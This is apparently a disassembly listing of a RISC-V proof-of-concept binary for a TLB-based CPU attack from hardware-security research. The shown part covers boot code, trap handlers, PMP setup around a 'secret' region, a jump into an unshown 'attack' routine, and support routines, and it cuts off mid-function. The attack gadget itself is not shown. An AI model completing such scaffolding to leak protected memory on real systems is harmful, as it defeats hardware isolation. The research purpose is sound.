
/mnt/milesan-meta/pocs/specdoctor/tlb-attack/Template/tlb-exploit.riscv:     file format elf64-littleriscv


Disassembly of section .text.init:

0000000080000000 <_start>:
    80000000:	03c0006f          	j	8000003c <handle_reset>

0000000080000004 <nmi_vector>:
    80000004:	0000006f          	j	80000004 <nmi_vector>

0000000080000008 <mtvec_handler>:
    80000008:	00300193          	li	gp,3
    8000000c:	00007517          	auipc	a0,0x7
    80000010:	ff450513          	add	a0,a0,-12 # 80007000 <tohost>
    80000014:	00353023          	sd	gp,0(a0)
    80000018:	ffdff06f          	j	80000014 <mtvec_handler+0xc>

000000008000001c <stvec_handler>:
    8000001c:	00018663          	beqz	gp,80000028 <stvec_handler+0xc>
    80000020:	14119073          	csrw	sepc,gp
    80000024:	10200073          	sret
    80000028:	00100193          	li	gp,1
    8000002c:	00007517          	auipc	a0,0x7
    80000030:	fd450513          	add	a0,a0,-44 # 80007000 <tohost>
    80000034:	00353023          	sd	gp,0(a0)
    80000038:	ffdff06f          	j	80000034 <stvec_handler+0x18>

000000008000003c <handle_reset>:
    8000003c:	3a005073          	csrw	pmpcfg0,0
    80000040:	30005073          	csrw	mstatus,0
    80000044:	00000093          	li	ra,0
    80000048:	00000113          	li	sp,0
    8000004c:	00000193          	li	gp,0
    80000050:	00000213          	li	tp,0
    80000054:	00000293          	li	t0,0
    80000058:	00000313          	li	t1,0
    8000005c:	00000393          	li	t2,0
    80000060:	00000413          	li	s0,0
    80000064:	00000493          	li	s1,0
    80000068:	00000513          	li	a0,0
    8000006c:	00000593          	li	a1,0
    80000070:	00000613          	li	a2,0
    80000074:	00000693          	li	a3,0
    80000078:	00000713          	li	a4,0
    8000007c:	00000793          	li	a5,0
    80000080:	00000813          	li	a6,0
    80000084:	00000893          	li	a7,0
    80000088:	00000913          	li	s2,0
    8000008c:	00000993          	li	s3,0
    80000090:	00000a13          	li	s4,0
    80000094:	00000a93          	li	s5,0
    80000098:	00000b13          	li	s6,0
    8000009c:	00000b93          	li	s7,0
    800000a0:	00000c13          	li	s8,0
    800000a4:	00000c93          	li	s9,0
    800000a8:	00000d13          	li	s10,0
    800000ac:	00000d93          	li	s11,0
    800000b0:	00000e13          	li	t3,0
    800000b4:	00000e93          	li	t4,0
    800000b8:	00000f13          	li	t5,0
    800000bc:	00000f93          	li	t6,0
    800000c0:	000062b7          	lui	t0,0x6
    800000c4:	3002a073          	csrs	mstatus,t0
    800000c8:	00000297          	auipc	t0,0x0
    800000cc:	08c28293          	add	t0,t0,140 # 80000154 <handle_reset+0x118>
    800000d0:	30529073          	csrw	mtvec,t0
    800000d4:	f0000053          	fmv.w.x	ft0,zero
    800000d8:	f00000d3          	fmv.w.x	ft1,zero
    800000dc:	f0000153          	fmv.w.x	ft2,zero
    800000e0:	f00001d3          	fmv.w.x	ft3,zero
    800000e4:	f0000253          	fmv.w.x	ft4,zero
    800000e8:	f00002d3          	fmv.w.x	ft5,zero
    800000ec:	f0000353          	fmv.w.x	ft6,zero
    800000f0:	f00003d3          	fmv.w.x	ft7,zero
    800000f4:	f0000453          	fmv.w.x	fs0,zero
    800000f8:	f00004d3          	fmv.w.x	fs1,zero
    800000fc:	f0000553          	fmv.w.x	fa0,zero
    80000100:	f00005d3          	fmv.w.x	fa1,zero
    80000104:	f0000653          	fmv.w.x	fa2,zero
    80000108:	f00006d3          	fmv.w.x	fa3,zero
    8000010c:	f0000753          	fmv.w.x	fa4,zero
    80000110:	f00007d3          	fmv.w.x	fa5,zero
    80000114:	f0000853          	fmv.w.x	fa6,zero
    80000118:	f00008d3          	fmv.w.x	fa7,zero
    8000011c:	f0000953          	fmv.w.x	fs2,zero
    80000120:	f00009d3          	fmv.w.x	fs3,zero
    80000124:	f0000a53          	fmv.w.x	fs4,zero
    80000128:	f0000ad3          	fmv.w.x	fs5,zero
    8000012c:	f0000b53          	fmv.w.x	fs6,zero
    80000130:	f0000bd3          	fmv.w.x	fs7,zero
    80000134:	f0000c53          	fmv.w.x	fs8,zero
    80000138:	f0000cd3          	fmv.w.x	fs9,zero
    8000013c:	f0000d53          	fmv.w.x	fs10,zero
    80000140:	f0000dd3          	fmv.w.x	fs11,zero
    80000144:	f0000e53          	fmv.w.x	ft8,zero
    80000148:	f0000ed3          	fmv.w.x	ft9,zero
    8000014c:	f0000f53          	fmv.w.x	ft10,zero
    80000150:	f0000fd3          	fmv.w.x	ft11,zero
    80000154:	00000297          	auipc	t0,0x0
    80000158:	eb428293          	add	t0,t0,-332 # 80000008 <mtvec_handler>
    8000015c:	30529073          	csrw	mtvec,t0
    80000160:	00000297          	auipc	t0,0x0
    80000164:	ebc28293          	add	t0,t0,-324 # 8000001c <stvec_handler>
    80000168:	10529073          	csrw	stvec,t0
    8000016c:	0000a117          	auipc	sp,0xa
    80000170:	e9410113          	add	sp,sp,-364 # 8000a000 <_end+0x1000>
    80000174:	0000b217          	auipc	tp,0xb
    80000178:	e8c20213          	add	tp,tp,-372 # 8000b000 <_end+0x2000>
    8000017c:	00100513          	li	a0,1
    80000180:	30652073          	csrs	mcounteren,a0
    80000184:	00002537          	lui	a0,0x2
    80000188:	8005051b          	addw	a0,a0,-2048 # 1800 <threadsense.2+0x177c>
    8000018c:	30053073          	csrc	mstatus,a0
    80000190:	00001537          	lui	a0,0x1
    80000194:	8005051b          	addw	a0,a0,-2048 # 800 <threadsense.2+0x77c>
    80000198:	30052073          	csrs	mstatus,a0
    8000019c:	00200297          	auipc	t0,0x200
    800001a0:	e6428293          	add	t0,t0,-412 # 80200000 <attack>
    800001a4:	34129073          	csrw	mepc,t0
    800001a8:	30200073          	mret

Disassembly of section .tohost:

0000000080007000 <tohost>:
	...

0000000080007040 <fromhost>:
	...

Disassembly of section .text:

0000000080007048 <pmp_boot>:
    80007048:	fe010113          	add	sp,sp,-32
    8000704c:	00813c23          	sd	s0,24(sp)
    80007050:	02010413          	add	s0,sp,32
    80007054:	01f00793          	li	a5,31
    80007058:	fef43423          	sd	a5,-24(s0)
    8000705c:	fff00793          	li	a5,-1
    80007060:	00b7d793          	srl	a5,a5,0xb
    80007064:	fef43023          	sd	a5,-32(s0)
    80007068:	fe843783          	ld	a5,-24(s0)
    8000706c:	fe043703          	ld	a4,-32(s0)
    80007070:	00000297          	auipc	t0,0x0
    80007074:	01c28293          	add	t0,t0,28 # 8000708c <pmp_boot+0x44>
    80007078:	305292f3          	csrrw	t0,mtvec,t0
    8000707c:	3b771073          	csrw	pmpaddr7,a4
    80007080:	00078513          	mv	a0,a5
    80007084:	03851513          	sll	a0,a0,0x38
    80007088:	3a051073          	csrw	pmpcfg0,a0
    8000708c:	30529073          	csrw	mtvec,t0
    80007090:	01800793          	li	a5,24
    80007094:	fef43423          	sd	a5,-24(s0)
    80007098:	007f9797          	auipc	a5,0x7f9
    8000709c:	f6878793          	add	a5,a5,-152 # 80800000 <secret>
    800070a0:	0027d793          	srl	a5,a5,0x2
    800070a4:	1ff7e793          	or	a5,a5,511
    800070a8:	fef43023          	sd	a5,-32(s0)
    800070ac:	fe843783          	ld	a5,-24(s0)
    800070b0:	fe043703          	ld	a4,-32(s0)
    800070b4:	3b071073          	csrw	pmpaddr0,a4
    800070b8:	3a07a073          	csrs	pmpcfg0,a5
    800070bc:	00000013          	nop
    800070c0:	01813403          	ld	s0,24(sp)
    800070c4:	02010113          	add	sp,sp,32
    800070c8:	00008067          	ret

00000000800070cc <printArray>:
    800070cc:	fd010113          	add	sp,sp,-48
    800070d0:	02813423          	sd	s0,40(sp)
    800070d4:	03010413          	add	s0,sp,48
    800070d8:	fea43423          	sd	a0,-24(s0)
    800070dc:	00058793          	mv	a5,a1
    800070e0:	fcc43c23          	sd	a2,-40(s0)
    800070e4:	fef42223          	sw	a5,-28(s0)
    800070e8:	00000013          	nop
    800070ec:	02813403          	ld	s0,40(sp)
    800070f0:	03010113          	add	sp,sp,48
    800070f4:	00008067          	ret

00000000800070f8 <printDoubleArray>:
    800070f8:	fd010113          	add	sp,sp,-48
    800070fc:	02813423          	sd	s0,40(sp)
    80007100:	03010413          	add	s0,sp,48
    80007104:	fea43423          	sd	a0,-24(s0)
    80007108:	00058793          	mv	a5,a1
    8000710c:	fcc43c23          	sd	a2,-40(s0)
    80007110:	fef42223          	sw	a5,-28(s0)
    80007114:	00000013          	nop
    80007118:	02813403          	ld	s0,40(sp)
    8000711c:	03010113          	add	sp,sp,48
    80007120:	00008067          	ret

0000000080007124 <verify>:
    80007124:	fb010113          	add	sp,sp,-80
    80007128:	04813423          	sd	s0,72(sp)
    8000712c:	05010413          	add	s0,sp,80
    80007130:	00050793          	mv	a5,a0
    80007134:	fcb43023          	sd	a1,-64(s0)
    80007138:	fac43c23          	sd	a2,-72(s0)
    8000713c:	fcf42623          	sw	a5,-52(s0)
    80007140:	fe042623          	sw	zero,-20(s0)
    80007144:	0c80006f          	j	8000720c <verify+0xe8>
    80007148:	fec42783          	lw	a5,-20(s0)
    8000714c:	00279793          	sll	a5,a5,0x2
    80007150:	fc043703          	ld	a4,-64(s0)
    80007154:	00f707b3          	add	a5,a4,a5
    80007158:	0007a783          	lw	a5,0(a5)
    8000715c:	fef42423          	sw	a5,-24(s0)
    80007160:	fec42783          	lw	a5,-20(s0)
    80007164:	00178793          	add	a5,a5,1
    80007168:	00279793          	sll	a5,a5,0x2
    8000716c:	fc043703          	ld	a4,-64(s0)
    80007170:	00f707b3          	add	a5,a4,a5
    80007174:	0007a783          	lw	a5,0(a5)
    80007178:	fef42223          	sw	a5,-28(s0)
    8000717c:	fec42783          	lw	a5,-20(s0)
    80007180:	00279793          	sll	a5,a5,0x2
    80007184:	fb843703          	ld	a4,-72(s0)
    80007188:	00f707b3          	add	a5,a4,a5
    8000718c:	0007a783          	lw	a5,0(a5)
    80007190:	fef42023          	sw	a5,-32(s0)
    80007194:	fec42783          	lw	a5,-20(s0)
    80007198:	00178793          	add	a5,a5,1
    8000719c:	00279793          	sll	a5,a5,0x2
    800071a0:	fb843703          	ld	a4,-72(s0)
    800071a4:	00f707b3          	add	a5,a4,a5
    800071a8:	0007a783          	lw	a5,0(a5)
    800071ac:	fcf42e23          	sw	a5,-36(s0)
    800071b0:	fe842783          	lw	a5,-24(s0)
    800071b4:	00078713          	mv	a4,a5
    800071b8:	fe042783          	lw	a5,-32(s0)
    800071bc:	0007071b          	sext.w	a4,a4
    800071c0:	0007879b          	sext.w	a5,a5
    800071c4:	00f70a63          	beq	a4,a5,800071d8 <verify+0xb4>
    800071c8:	fec42783          	lw	a5,-20(s0)
    800071cc:	0017879b          	addw	a5,a5,1
    800071d0:	0007879b          	sext.w	a5,a5
    800071d4:	0b80006f          	j	8000728c <verify+0x168>
    800071d8:	fe442783          	lw	a5,-28(s0)
    800071dc:	00078713          	mv	a4,a5
    800071e0:	fdc42783          	lw	a5,-36(s0)
    800071e4:	0007071b          	sext.w	a4,a4
    800071e8:	0007879b          	sext.w	a5,a5
    800071ec:	00f70a63          	beq	a4,a5,80007200 <verify+0xdc>
    800071f0:	fec42783          	lw	a5,-20(s0)
    800071f4:	0027879b          	addw	a5,a5,2
    800071f8:	0007879b          	sext.w	a5,a5
    800071fc:	0900006f          	j	8000728c <verify+0x168>
    80007200:	fec42783          	lw	a5,-20(s0)
    80007204:	0027879b          	addw	a5,a5,2
    80007208:	fef42623          	sw	a5,-20(s0)
    8000720c:	fcc42783          	lw	a5,-52(s0)
    80007210:	01f7d71b          	srlw	a4,a5,0x1f
    80007214:	00f707bb          	addw	a5,a4,a5
    80007218:	4017d79b          	sraw	a5,a5,0x1
    8000721c:	0007879b          	sext.w	a5,a5
    80007220:	0017979b          	sllw	a5,a5,0x1
    80007224:	0007871b          	sext.w	a4,a5
    80007228:	fec42783          	lw	a5,-20(s0)
    8000722c:	0007879b          	sext.w	a5,a5
    80007230:	f0e7cce3          	blt	a5,a4,80007148 <verify+0x24>
    80007234:	fcc42783          	lw	a5,-52(s0)
    80007238:	0017f793          	and	a5,a5,1
    8000723c:	0007879b          	sext.w	a5,a5
    80007240:	04078463          	beqz	a5,80007288 <verify+0x164>
    80007244:	fcc42783          	lw	a5,-52(s0)
    80007248:	00279793          	sll	a5,a5,0x2
    8000724c:	ffc78793          	add	a5,a5,-4
    80007250:	fc043703          	ld	a4,-64(s0)
    80007254:	00f707b3          	add	a5,a4,a5
    80007258:	0007a783          	lw	a5,0(a5)
    8000725c:	0007869b          	sext.w	a3,a5
    80007260:	fcc42783          	lw	a5,-52(s0)
    80007264:	00279793          	sll	a5,a5,0x2
    80007268:	ffc78793          	add	a5,a5,-4
    8000726c:	fb843703          	ld	a4,-72(s0)
    80007270:	00f707b3          	add	a5,a4,a5
    80007274:	0007a783          	lw	a5,0(a5)
    80007278:	00068713          	mv	a4,a3
    8000727c:	00f70663          	beq	a4,a5,80007288 <verify+0x164>
    80007280:	fcc42783          	lw	a5,-52(s0)
    80007284:	0080006f          	j	8000728c <verify+0x168>
    80007288:	00000793          	li	a5,0
    8000728c:	00078513          	mv	a0,a5
    80007290:	04813403          	ld	s0,72(sp)
    80007294:	05010113          	add	sp,sp,80
    80007298:	00008067          	ret

000000008000729c <verifyDouble>:
    8000729c:	fa010113          	add	sp,sp,-96
    800072a0:	04813c23          	sd	s0,88(sp)
    800072a4:	06010413          	add	s0,sp,96
    800072a8:	00050793          	mv	a5,a0
    800072ac:	fab43823          	sd	a1,-80(s0)
    800072b0:	fac43423          	sd	a2,-88(s0)
    800072b4:	faf42e23          	sw	a5,-68(s0)
    800072b8:	fe042623          	sw	zero,-20(s0)
    800072bc:	0dc0006f          	j	80007398 <verifyDouble+0xfc>
    800072c0:	fec42783          	lw	a5,-20(s0)
    800072c4:	00379793          	sll	a5,a5,0x3
    800072c8:	fb043703          	ld	a4,-80(s0)
    800072cc:	00f707b3          	add	a5,a4,a5
    800072d0:	0007b787          	fld	fa5,0(a5)
    800072d4:	fef43027          	fsd	fa5,-32(s0)
    800072d8:	fec42783          	lw	a5,-20(s0)
    800072dc:	00178793          	add	a5,a5,1
    800072e0:	00379793          	sll	a5,a5,0x3
    800072e4:	fb043703          	ld	a4,-80(s0)
    800072e8:	00f707b3          	add	a5,a4,a5
    800072ec:	0007b787          	fld	fa5,0(a5)
    800072f0:	fcf43c27          	fsd	fa5,-40(s0)
    800072f4:	fec42783          	lw	a5,-20(s0)
    800072f8:	00379793          	sll	a5,a5,0x3
    800072fc:	fa843703          	ld	a4,-88(s0)
    80007300:	00f707b3          	add	a5,a4,a5
    80007304:	0007b787          	fld	fa5,0(a5)
    80007308:	fcf43827          	fsd	fa5,-48(s0)
    8000730c:	fec42783          	lw	a5,-20(s0)
    80007310:	00178793          	add	a5,a5,1
    80007314:	00379793          	sll	a5,a5,0x3
    80007318:	fa843703          	ld	a4,-88(s0)
    8000731c:	00f707b3          	add	a5,a4,a5
    80007320:	0007b787          	fld	fa5,0(a5)
    80007324:	fcf43427          	fsd	fa5,-56(s0)
    80007328:	fe043707          	fld	fa4,-32(s0)
    8000732c:	fd043787          	fld	fa5,-48(s0)
    80007330:	a2f727d3          	feq.d	a5,fa4,fa5
    80007334:	00f037b3          	snez	a5,a5
    80007338:	0ff7f793          	zext.b	a5,a5
    8000733c:	fcf42223          	sw	a5,-60(s0)
    80007340:	fd843707          	fld	fa4,-40(s0)
    80007344:	fc843787          	fld	fa5,-56(s0)
    80007348:	a2f727d3          	feq.d	a5,fa4,fa5
    8000734c:	00f037b3          	snez	a5,a5
    80007350:	0ff7f793          	zext.b	a5,a5
    80007354:	fcf42023          	sw	a5,-64(s0)
    80007358:	fc442783          	lw	a5,-60(s0)
    8000735c:	00078713          	mv	a4,a5
    80007360:	fc042783          	lw	a5,-64(s0)
    80007364:	00f777b3          	and	a5,a4,a5
    80007368:	0007879b          	sext.w	a5,a5
    8000736c:	02079063          	bnez	a5,8000738c <verifyDouble+0xf0>
    80007370:	fec42783          	lw	a5,-20(s0)
    80007374:	0017879b          	addw	a5,a5,1
    80007378:	0007879b          	sext.w	a5,a5
    8000737c:	fc442703          	lw	a4,-60(s0)
    80007380:	00f707bb          	addw	a5,a4,a5
    80007384:	0007879b          	sext.w	a5,a5
    80007388:	08c0006f          	j	80007414 <verifyDouble+0x178>
    8000738c:	fec42783          	lw	a5,-20(s0)
    80007390:	0027879b          	addw	a5,a5,2
    80007394:	fef42623          	sw	a5,-20(s0)
    80007398:	fbc42783          	lw	a5,-68(s0)
    8000739c:	01f7d71b          	srlw	a4,a5,0x1f
    800073a0:	00f707bb          	addw	a5,a4,a5
    800073a4:	4017d79b          	sraw	a5,a5,0x1
    800073a8:	0007879b          	sext.w	a5,a5
    800073ac:	0017979b          	sllw	a5,a5,0x1
    800073b0:	0007871b          	sext.w	a4,a5
    800073b4:	fec42783          	lw	a5,-20(s0)
    800073b8:	0007879b          	sext.w	a5,a5
    800073bc:	f0e7c2e3          	blt	a5,a4,800072c0 <verifyDouble+0x24>
    800073c0:	fbc42783          	lw	a5,-68(s0)
    800073c4:	0017f793          	and	a5,a5,1
    800073c8:	0007879b          	sext.w	a5,a5
    800073cc:	04078263          	beqz	a5,80007410 <verifyDouble+0x174>
    800073d0:	fbc42783          	lw	a5,-68(s0)
    800073d4:	00379793          	sll	a5,a5,0x3
    800073d8:	ff878793          	add	a5,a5,-8
    800073dc:	fb043703          	ld	a4,-80(s0)
    800073e0:	00f707b3          	add	a5,a4,a5
    800073e4:	0007b707          	fld	fa4,0(a5)
    800073e8:	fbc42783          	lw	a5,-68(s0)
    800073ec:	00379793          	sll	a5,a5,0x3
    800073f0:	ff878793          	add	a5,a5,-8
    800073f4:	fa843703          	ld	a4,-88(s0)
    800073f8:	00f707b3          	add	a5,a4,a5
    800073fc:	0007b787          	fld	fa5,0(a5)
    80007400:	a2f727d3          	feq.d	a5,fa4,fa5
    80007404:	00079663          	bnez	a5,80007410 <verifyDouble+0x174>
    80007408:	fbc42783          	lw	a5,-68(s0)
    8000740c:	0080006f          	j	80007414 <verifyDouble+0x178>
    80007410:	00000793          	li	a5,0
    80007414:	00078513          	mv	a0,a5
    80007418:	05813403          	ld	s0,88(sp)
    8000741c:	06010113          	add	sp,sp,96
    80007420:	00008067          	ret

0000000080007424 <barrier>:
    80007424:	fe010113          	add	sp,sp,-32
    80007428:	00813c23          	sd	s0,24(sp)
    8000742c:	02010413          	add	s0,sp,32
    80007430:	00050793          	mv	a5,a0
    80007434:	fef42623          	sw	a5,-20(s0)
    80007438:	0ff0000f          	fence
    8000743c:	00022783          	lw	a5,0(tp) # 0 <threadsense.5>
    80007440:	0017b793          	seqz	a5,a5
    80007444:	0ff7f793          	zext.b	a5,a5
    80007448:	0007871b          	sext.w	a4,a5
    8000744c:	00e22023          	sw	a4,0(tp) # 0 <threadsense.5>
    80007450:	ffffa797          	auipc	a5,0xffffa
    80007454:	bb078793          	add	a5,a5,-1104 # 80001000 <count.2>
    80007458:	00100713          	li	a4,1
    8000745c:	0f50000f          	fence	iorw,ow
    80007460:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    80007464:	0006879b          	sext.w	a5,a3
    80007468:	0007871b          	sext.w	a4,a5
    8000746c:	fec42783          	lw	a5,-20(s0)
    80007470:	fff7879b          	addw	a5,a5,-1
    80007474:	0007879b          	sext.w	a5,a5
    80007478:	02f71263          	bne	a4,a5,8000749c <barrier+0x78>
    8000747c:	ffffa797          	auipc	a5,0xffffa
    80007480:	b8478793          	add	a5,a5,-1148 # 80001000 <count.2>
    80007484:	0007a023          	sw	zero,0(a5)
    80007488:	00022703          	lw	a4,0(tp) # 0 <threadsense.5>
    8000748c:	ffffa797          	auipc	a5,0xffffa
    80007490:	b7878793          	add	a5,a5,-1160 # 80001004 <sense.1>
    80007494:	00e7a023          	sw	a4,0(a5)
    80007498:	0200006f          	j	800074b8 <barrier+0x94>
    8000749c:	00000013          	nop
    800074a0:	ffffa797          	auipc	a5,0xffffa
    800074a4:	b6478793          	add	a5,a5,-1180 # 80001004 <sense.1>
    800074a8:	0007a783          	lw	a5,0(a5)
    800074ac:	0007871b          	sext.w	a4,a5
    800074b0:	00022783          	lw	a5,0(tp) # 0 <threadsense.5>
    800074b4:	fef716e3          	bne	a4,a5,800074a0 <barrier+0x7c>
    800074b8:	0ff0000f          	fence
    800074bc:	00000013          	nop
    800074c0:	01813403          	ld	s0,24(sp)
    800074c4:	02010113          	add	sp,sp,32
    800074c8:	00008067          	ret

00000000800074cc <lfsr>:
    800074cc:	fd010113          	add	sp,sp,-48
    800074d0:	02813423          	sd	s0,40(sp)
    800074d4:	03010413          	add	s0,sp,48
    800074d8:	fca43c23          	sd	a0,-40(s0)
    800074dc:	fd843783          	ld	a5,-40(s0)
    800074e0:	0017d713          	srl	a4,a5,0x1
    800074e4:	fd843783          	ld	a5,-40(s0)
    800074e8:	00f747b3          	xor	a5,a4,a5
    800074ec:	0017f793          	and	a5,a5,1
    800074f0:	fef43423          	sd	a5,-24(s0)
    800074f4:	fd843783          	ld	a5,-40(s0)
    800074f8:	0017d713          	srl	a4,a5,0x1
    800074fc:	fe843783          	ld	a5,-24(s0)
    80007500:	03e79793          	sll	a5,a5,0x3e
    80007504:	00f767b3          	or	a5,a4,a5
    80007508:	00078513          	mv	a0,a5
    8000750c:	02813403          	ld	s0,40(sp)
    80007510:	03010113          	add	sp,sp,48
    80007514:	00008067          	ret

0000000080007518 <lfsr10>:
    80007518:	fd010113          	add	sp,sp,-48
    8000751c:	02813423          	sd	s0,40(sp)
    80007520:	03010413          	add	s0,sp,48
    80007524:	fca43c23          	sd	a0,-40(s0)
    80007528:	fd843783          	ld	a5,-40(s0)
    8000752c:	00a7d713          	srl	a4,a5,0xa
    80007530:	fd843783          	ld	a5,-40(s0)
    80007534:	00f747b3          	xor	a5,a4,a5
    80007538:	3ff7f793          	and	a5,a5,1023
    8000753c:	fef43423          	sd	a5,-24(s0)
    80007540:	fd843783          	ld	a5,-40(s0)
    80007544:	00a7d713          	srl	a4,a5,0xa
    80007548:	fe843783          	ld	a5,-24(s0)
    8000754c:	03579793          	sll	a5,a5,0x35
    80007550:	00f767b3          	or	a5,a4,a5
    80007554:	00078513          	mv	a0,a5
    80007558:	02813403          	ld	s0,40(sp)
    8000755c:	03010113          	add	sp,sp,48
    80007560:	00008067          	ret

0000000080007564 <syscall>:
    80007564:	f5010113          	add	sp,sp,-176
    80007568:	0a813423          	sd	s0,168(sp)
    8000756c:	0b010413          	add	s0,sp,176
    80007570:	f6a43c23          	sd	a0,-136(s0)
    80007574:	f6b43823          	sd	a1,-144(s0)
    80007578:	f6c43423          	sd	a2,-152(s0)
    8000757c:	f6d43023          	sd	a3,-160(s0)
    80007580:	ff040793          	add	a5,s0,-16
    80007584:	f4f43c23          	sd	a5,-168(s0)
    80007588:	f5843783          	ld	a5,-168(s0)
    8000758c:	f9078793          	add	a5,a5,-112
    80007590:	03f78793          	add	a5,a5,63
    80007594:	0067d793          	srl	a5,a5,0x6
    80007598:	00679793          	sll	a5,a5,0x6
    8000759c:	f7843703          	ld	a4,-136(s0)
    800075a0:	00e7b023          	sd	a4,0(a5)
    800075a4:	f7043703          	ld	a4,-144(s0)
    800075a8:	00e7b423          	sd	a4,8(a5)
    800075ac:	f6843703          	ld	a4,-152(s0)
    800075b0:	00e7b823          	sd	a4,16(a5)
    800075b4:	f6043703          	ld	a4,-160(s0)
    800075b8:	00e7bc23          	sd	a4,24(a5)
    800075bc:	0ff0000f          	fence
    800075c0:	00078693          	mv	a3,a5
    800075c4:	00000717          	auipc	a4,0x0
    800075c8:	a3c70713          	add	a4,a4,-1476 # 80007000 <tohost>
    800075cc:	00d73023          	sd	a3,0(a4)
    800075d0:	00000013          	nop
    800075d4:	00000717          	auipc	a4,0x0
    800075d8:	a6c70713          	add	a4,a4,-1428 # 80007040 <fromhost>
    800075dc:	00073703          	ld	a4,0(a4)
    800075e0:	fe070ae3          	beqz	a4,800075d4 <syscall+0x70>
    800075e4:	00000717          	auipc	a4,0x0
    800075e8:	a5c70713          	add	a4,a4,-1444 # 80007040 <fromhost>
    800075ec:	00073023          	sd	zero,0(a4)
    800075f0:	0ff0000f          	fence
    800075f4:	0007b783          	ld	a5,0(a5)
    800075f8:	00078513          	mv	a0,a5
    800075fc:	0a813403          	ld	s0,168(sp)
    80007600:	0b010113          	add	sp,sp,176
    80007604:	00008067          	ret

0000000080007608 <tohost_exit>:
    80007608:	fe010113          	add	sp,sp,-32
    8000760c:	00813c23          	sd	s0,24(sp)
    80007610:	02010413          	add	s0,sp,32
    80007614:	fea43423          	sd	a0,-24(s0)
    80007618:	fe843783          	ld	a5,-24(s0)
    8000761c:	00179793          	sll	a5,a5,0x1
    80007620:	0017e713          	or	a4,a5,1
    80007624:	00000797          	auipc	a5,0x0
    80007628:	9dc78793          	add	a5,a5,-1572 # 80007000 <tohost>
    8000762c:	00e7b023          	sd	a4,0(a5)
    80007630:	00000013          	nop
    80007634:	ffdff06f          	j	80007630 <tohost_exit+0x28>

0000000080007638 <handle_trap>:
    80007638:	fd010113          	add	sp,sp,-48
    8000763c:	02113423          	sd	ra,40(sp)
    80007640:	02813023          	sd	s0,32(sp)
    80007644:	03010413          	add	s0,sp,48
    80007648:	fea43423          	sd	a0,-24(s0)
    8000764c:	feb43023          	sd	a1,-32(s0)
    80007650:	fcc43c23          	sd	a2,-40(s0)
    80007654:	53900513          	li	a0,1337
    80007658:	fb1ff0ef          	jal	80007608 <tohost_exit>

000000008000765c <exit>:
    8000765c:	fe010113          	add	sp,sp,-32
    80007660:	00113c23          	sd	ra,24(sp)
    80007664:	00813823          	sd	s0,16(sp)
    80007668:	02010413          	add	s0,sp,32
    8000766c:	00050793          	mv	a5,a0
    80007670:	fef42623          	sw	a5,-20(s0)
    80007674:	fec42783          	lw	a5,-20(s0)
    80007678:	00078513          	mv	a0,a5
    8000767c:	f8dff0ef          	jal	80007608 <tohost_exit>

0000000080007680 <abort>:
    80007680:	ff010113          	add	sp,sp,-16
    80007684:	00113423          	sd	ra,8(sp)
    80007688:	00813023          	sd	s0,0(sp)
    8000768c:	01010413          	add	s0,sp,16
    80007690:	08600513          	li	a0,134
    80007694:	fc9ff0ef          	jal	8000765c <exit>

0000000080007698 <printstr>:
    80007698:	fd010113          	add	sp,sp,-48
    8000769c:	02113423          	sd	ra,40(sp)
    800076a0:	02813023          	sd	s0,32(sp)
    800076a4:	00913c23          	sd	s1,24(sp)
    800076a8:	03010413          	add	s0,sp,48
    800076ac:	fca43c23          	sd	a0,-40(s0)
    800076b0:	fd843483          	ld	s1,-40(s0)
    800076b4:	fd843503          	ld	a0,-40(s0)
    800076b8:	3d9000ef          	jal	80008290 <strlen>
    800076bc:	00050793          	mv	a5,a0
    800076c0:	00078693          	mv	a3,a5
    800076c4:	00048613          	mv	a2,s1
    800076c8:	00100593          	li	a1,1
    800076cc:	04000513          	li	a0,64
    800076d0:	e95ff0ef          	jal	80007564 <syscall>
    800076d4:	00000013          	nop
    800076d8:	02813083          	ld	ra,40(sp)
    800076dc:	02013403          	ld	s0,32(sp)
    800076e0:	01813483          	ld	s1,24(sp)
    800076e4:	03010113          	add	sp,sp,48
    800076e8:	00008067          	ret

00000000800076ec <putchar>:
    800076ec:	fe010113          	add	sp,sp,-32
    800076f0:	00113c23          	sd	ra,24(sp)
    800076f4:	00813823          	sd	s0,16(sp)
    800076f8:	02010413          	add	s0,sp,32
    800076fc:	00050793          	mv	a5,a0
    80007700:	fef42623          	sw	a5,-20(s0)
    80007704:	08022783          	lw	a5,128(tp) # 80 <buflen.3>
    80007708:	0017871b          	addw	a4,a5,1
    8000770c:	0007069b          	sext.w	a3,a4
    80007710:	08d22023          	sw	a3,128(tp) # 80 <buflen.3>
    80007714:	fec42703          	lw	a4,-20(s0)
    80007718:	0ff77713          	zext.b	a4,a4
    8000771c:	04020693          	add	a3,tp,64 # 40 <buf.4>
    80007720:	00f687b3          	add	a5,a3,a5
    80007724:	00e78023          	sb	a4,0(a5)
    80007728:	fec42783          	lw	a5,-20(s0)
    8000772c:	0007871b          	sext.w	a4,a5
    80007730:	00a00793          	li	a5,10
    80007734:	00f70a63          	beq	a4,a5,80007748 <putchar+0x5c>
    80007738:	08022783          	lw	a5,128(tp) # 80 <buflen.3>
    8000773c:	00078713          	mv	a4,a5
    80007740:	04000793          	li	a5,64
    80007744:	02f71263          	bne	a4,a5,80007768 <putchar+0x7c>
    80007748:	04020713          	add	a4,tp,64 # 40 <buf.4>
    8000774c:	08022783          	lw	a5,128(tp) # 80 <buflen.3>
    80007750:	00078693          	mv	a3,a5
    80007754:	00070613          	mv	a2,a4
    80007758:	00100593          	li	a1,1
    8000775c:	04000513          	li	a0,64
    80007760:	e05ff0ef          	jal	80007564 <syscall>
    80007764:	08022023          	sw	zero,128(tp) # 80 <buflen.3>
    80007768:	00000793          	li	a5,0
    8000776c:	00078513          	mv	a0,a5
    80007770:	01813083          	ld	ra,24(sp)
    80007774:	01013403          	ld	s0,16(sp)
    80007778:	02010113          	add	sp,sp,32
    8000777c:	00008067          	ret

0000000080007780 <printhex>:
    80007780:	fc010113          	add	sp,sp,-64
    80007784:	02113c23          	sd	ra,56(sp)
    80007788:	02813823          	sd	s0,48(sp)
    8000778c:	04010413          	add	s0,sp,64
    80007790:	fca43423          	sd	a0,-56(s0)
    80007794:	fe042623          	sw	zero,-20(s0)
    80007798:	06c0006f          	j	80007804 <printhex+0x84>
    8000779c:	fc843783          	ld	a5,-56(s0)
    800077a0:	0ff7f793          	zext.b	a5,a5
    800077a4:	00f7f793          	and	a5,a5,15
    800077a8:	0ff7f713          	zext.b	a4,a5
    800077ac:	fc843783          	ld	a5,-56(s0)
    800077b0:	00f7f693          	and	a3,a5,15
    800077b4:	00900793          	li	a5,9
